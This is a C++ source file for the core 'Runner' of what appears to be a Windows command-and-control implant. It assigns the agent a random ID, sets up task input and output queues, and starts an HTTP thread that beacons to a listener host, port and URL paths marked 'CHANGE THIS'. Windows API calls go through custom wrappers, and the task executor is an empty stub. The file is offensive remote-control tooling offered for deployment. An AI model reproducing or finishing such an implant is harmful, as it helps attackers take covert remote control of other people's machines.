#include <Windows.h>
#include "utils/buffer.h"
#include "utils/winapi.h"
#include "runner/runner.h"
#include "communicators/base.h"
#include "communicators/http.h"
#include "utils/random.h"
#include "utils/queue.h"

/* Constructor */
Runner::Runner()
    : winApiCustom(),
      pAgentId(NULL),
      TaskInputQueue(Queue(&winApiCustom, TRUE)),
      TaskOutputQueue(Queue(&winApiCustom, TRUE))
{
    // Generate and set Agent ID
    this->pAgentId = (PCHAR)this->winApiCustom.HeapAllocCustom(7); // 6 characters + 1 null-byte
    if (this->pAgentId != NULL)
    {
        RandomGenerator randomGenerator = RandomGenerator(&this->winApiCustom);
        randomGenerator.GenerateRandomStr(6, this->pAgentId);
    }
}

/* Destructor */
Runner::~Runner()
{
    // Free heap for Agent ID
    if (this->pAgentId != NULL)
        this->winApiCustom.HeapFreeCustom(this->pAgentId);
}

void Runner::Run()
{
    // Start Communicator thread
    HttpCommunicatorThreadArgs httpCommunicatorThreadArgs;
    httpCommunicatorThreadArgs.agentId = this->pAgentId;
    httpCommunicatorThreadArgs.listenerHost = "127.0.0.1";               // CHANGE THIS
    httpCommunicatorThreadArgs.listenerPort = 8080;                      // CHANGE THIS
    httpCommunicatorThreadArgs.pUrlPathChoices = "/path1\x00/path2\x00"; // CHANGE THIS
    httpCommunicatorThreadArgs.pWinApiCustom = &(this->winApiCustom);
    httpCommunicatorThreadArgs.pTaskInputQueue = &(this->TaskInputQueue);
    httpCommunicatorThreadArgs.pTaskOutputQueue = &(this->TaskOutputQueue);

    HANDLE hThreadCommunicator = this->winApiCustom.CreateThreadCustom(
        (LPTHREAD_START_ROUTINE)(HttpCommunicator::StartCommunicatorThread),
        &httpCommunicatorThreadArgs);
    if (hThreadCommunicator == NULL)
        return;

    // Start Executor thread

    // Wait for all threads to close, then close their handles
    this->winApiCustom.loadedFunctions.WaitForSingleObject(hThreadCommunicator, INFINITE);
    this->winApiCustom.loadedFunctions.CloseHandle(hThreadCommunicator);
}